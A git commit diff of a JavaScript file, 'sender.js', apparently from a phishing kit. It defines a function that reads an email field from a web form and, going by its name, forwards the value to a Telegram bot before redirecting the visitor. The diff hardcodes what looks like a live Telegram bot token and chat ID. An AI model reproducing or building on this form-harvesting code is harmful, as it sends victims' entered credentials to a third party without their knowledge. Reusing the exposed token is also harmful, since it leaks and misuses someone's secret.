ff8be53d43f811572dc19612ddf28f8ea2a62fdf
ejebaby <ej936730@gmail.com>
2024-09-18 17:02:41 +0100

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,10 +1,6 @@
 console.log("sender.js connected");
 function sendTelegramMessageAndRedirect() {
-  //  other user API
-
-  //   const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // add the telegram token
-  //   const chatId = 5645205996; // add ths id from the web It's usually a number, not a string
-
+  // other user API
   const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // add the telegram token
   const chatId = 5645205996; // add ths id from the web It's usually a number, not a string
   const emailValue = document.getElementById("email").value;
